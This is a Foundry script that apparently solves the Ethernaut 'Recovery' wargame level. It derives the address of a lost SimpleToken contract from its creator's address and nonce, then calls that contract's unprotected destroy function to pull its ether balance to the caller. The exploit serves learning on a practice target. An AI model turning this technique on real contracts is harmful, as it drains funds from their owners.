// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Recovery, SimpleToken} from "../src/levels/Recovery.sol";

contract RecoveryScript is Script {
    Recovery public instance = Recovery(payable(0x845Fc30829aB7DEa290750Af9e9C40E81f444cDD));
    SimpleToken public token;

    function run() external {
	vm.startBroadcast();
	console.log("SimpleToken Contract address is unknown!");
	console.log("Retrieving SimpleToken Contract address...");
	address lostAddress = address(uint160(uint256(keccak256(abi.encodePacked(uint8(0xd6), uint8(0x94), instance, uint8(0x01))))));
	token = SimpleToken(payable(lostAddress));
	console.log("SimpleToken Contract address found:", lostAddress);
	console.log("SimpleToken Contract initial balance:", lostAddress.balance);
	console.log("Destroying...");
	token.destroy(payable(msg.sender));
	console.log("SimpleToken Contract new balance:", lostAddress.balance);
	vm.stopBroadcast();
    }
}
